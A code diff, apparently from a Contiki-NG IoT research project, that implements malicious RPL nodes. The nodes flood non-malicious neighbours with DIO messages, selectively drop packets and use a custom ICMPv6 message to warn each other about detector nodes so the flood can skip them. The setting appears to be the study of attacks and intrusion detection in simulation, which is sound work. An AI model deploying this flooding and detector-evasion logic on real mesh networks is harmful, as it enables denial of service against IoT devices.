@@ -4,6 +4,7 @@
 
 /* Initialize RPL ICMPv6 Flooding message handler */
 UIP_ICMP6_HANDLER(flood_handler, ICMP6_RPL, RPL_CODE_FLOOD, flood_input);
+
 /* Init the flood handler */
 void rpl_icmp6_flood_init(){
     uip_icmp6_register_input_handler(&flood_handler);
@@ -21,12 +22,12 @@ void init_flood(){
 void init_select(){
     select = true;
     selecting = false;
-    icmp_total = icmp_dropped = packets_dropped = 0;
+    icmp_dropped = packets_dropped = 0;
     init_pair_array();
     init_malicious_array_selector();
 }
 
-/* Initiliaze the information of the neighbors array */
+/* Initiliaze the information of the neighbors */
 void init_neighbors_array(){
     uint8_t i;
     for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
@@ -34,17 +35,30 @@ void init_neighbors_array(){
     }
 }
 
+/* Init array with RPL length information */
 void init_pair_array(){
   pairs[0].message = RPL_CODE_DIS; pairs[0].length = DIS_length;
   pairs[1].message = RPL_CODE_DIO; pairs[1].length = DIO_length;
   pairs[2].message = RPL_CODE_DAO; pairs[2].length = DAO_length;
   pairs[3].message = RPL_CODE_DAO_ACK; pairs[3].length = DAO_ACK_length;
 }
+
+/* Initiliaze the information of the malicious neighbors */
 void init_malicious_array_selector(){
   uint8_t i;
   for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i){
       neighbors[i].used = neighbors[i].malicious = false;
   }
+}
+
+/* Start selecting packets */
+void start_filtering(){
+    selecting = true;
+}
+
+/* Start Hello flood attack */
+void start_flooding(){
+    flooding = true;
 }
 
 /* Main input fuction for RPL Flood ICMPv6 messages */
@@ -88,7 +102,7 @@ void flood_input(){
       }
     }
   }
-  else if (!strcmp(message,"warned") && flood){
+  else if (!strcmp(message,"warned") && flood){ // warning message
     uip_ipaddr_t detector;
     memcpy(&detector, buffer + 7, 16);
     remove_detector_from_flood(&detector);
@@ -106,6 +120,8 @@ void flood_input(){
  * 1st param: Destination IP address
  * 2nd param: Message Payload
  * 3rd param: Payload length
+ * 4th param: Detector warning message
+ * 5th param: Detector IP address if 4th param is set
 */
 void
 rpl_icmp6_malicious_output(uip_ipaddr_t *dest, const void *data, uint16_t datalen, bool detector_warning, uip_ipaddr_t *detector)
@@ -129,7 +145,9 @@ rpl_icmp6_malicious_output(uip_ipaddr_t *dest, const void *data, uint16_t datale
   uip_icmp6_send(dest, ICMP6_RPL, RPL_CODE_FLOOD, datalen);
 }
 
-/* Used to call the main Output function above. */
+/* Used to call the main Output function above. 
+ * 1st param: type of malicious code: 0 - flood, 1 - selector
+ */
 void malicious_output(uint8_t type){
   /* clear the buff to avoid possible errors */
   uipbuf_clear();
@@ -143,6 +161,12 @@ void malicious_output(uint8_t type){
   /* Send the message. 1st Param = NULL indicates multicast destination */
   rpl_icmp6_malicious_output(NULL, &message, sizeof(message),false,NULL);
 }
+
+/*
+ * Warn other malicious nodes about a detector
+ * 1st param: IP address of the detector
+ * 2nd param: IP address of the sender of the message
+ */
 void warn_detector_flooding(uip_ipaddr_t *detector, uip_ipaddr_t *sender){
   uint8_t i;
   for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
@@ -156,6 +180,10 @@ void warn_detector_flooding(uip_ipaddr_t *detector, uip_ipaddr_t *sender){
   }
 }
 
+/*
+ * Remove a detector from the DIO Flood attack
+ * 1st param: Detector IP address
+ */
 void remove_detector_from_flood(uip_ipaddr_t *detector) {
   if (flood){
     uint8_t i;
@@ -167,11 +195,14 @@ void remove_detector_from_flood(uip_ipaddr_t *detector) {
     }
   }
 }
+
 /* Add the neighbors to the neighbors array */
 void add_all_nodes(){
     if (flood) {
+        /* Get IP of root */
         uip_ipaddr_t root_ip;
         rpl_dag_get_root_ipaddr(&root_ip);
+	/* Don't store root IP */
         if (compare_ip_address(&root_ip, &UIP_IP_BUF->srcipaddr)) return;
         uint8_t i;
         for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
@@ -190,12 +221,10 @@ void add_all_nodes(){
 /* Launch the DIO Flood attack */
 void launch_flooding_attack(){
       uint8_t i;
-      uip_ipaddr_t root_ip;
-      rpl_dag_get_root_ipaddr(&root_ip);
       for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
             if (neighbors[i].used) {
-                /* If is not malicious and is not the root --> flood */
-                if (!neighbors[i].malicious && /*!compare_ip_address(&root_ip, &neighbors[i].ipaddr) && */!neighbors[i].detector) {
+                /* If is not malicious, is not the root and is not a detector --> flood */
+                if (!neighbors[i].malicious && !neighbors[i].detector) {
 		    rpl_icmp6_dio_output(&neighbors[i].ipaddr);
 		    char buf[21];
 		    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
@@ -212,15 +241,10 @@ void launch_flooding_attack(){
      }     
 }
 
-/* Check if the IP address of the 1st param is malicious */
-bool check_malicious_ip(uip_ipaddr_t *ip){
-    uint8_t i;
-    for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
-                if (neighbors[i].used && compare_ip_address(ip, &neighbors[i].ipaddr) && neighbors[i].malicious) return true;
-    }
-    return false;
-}
-/* Compare the ip addresses without prefix - without local vs global addresses */
+/* Compare the ip addresses without prefix - without local vs global addresses
+ * 1st param: IP 1 to compare
+ * 2nd param: IP 2 to compare
+ */
 bool compare_ip_address(uip_ipaddr_t *ip1, uip_ipaddr_t *ip2) {
   uint8_t i;
   for(i=2;i<8;++i){
@@ -228,6 +252,12 @@ bool compare_ip_address(uip_ipaddr_t *ip1, uip_ipaddr_t *ip2) {
   }
   return true;
 }
+
+/*
+ * Check if the length of the RPL packet is suspicious
+ * 1st param: type of RPL packet
+ * 2nd param: code of RPL packet
+ */
 bool check_suspicious_length(uint8_t type, uint8_t icode){
     uint8_t i;
     // Discard messages with different length of the original RPL messages 
@@ -240,13 +270,4 @@ bool check_suspicious_length(uint8_t type, uint8_t icode){
       }
     }
     return false;
-}
-/* Start selecting packets */
-void start_filtering(){
-    selecting = true;
-}
-
-/* Start Hello flood attack */
-void start_flooding(){
-    flooding = true;
 }
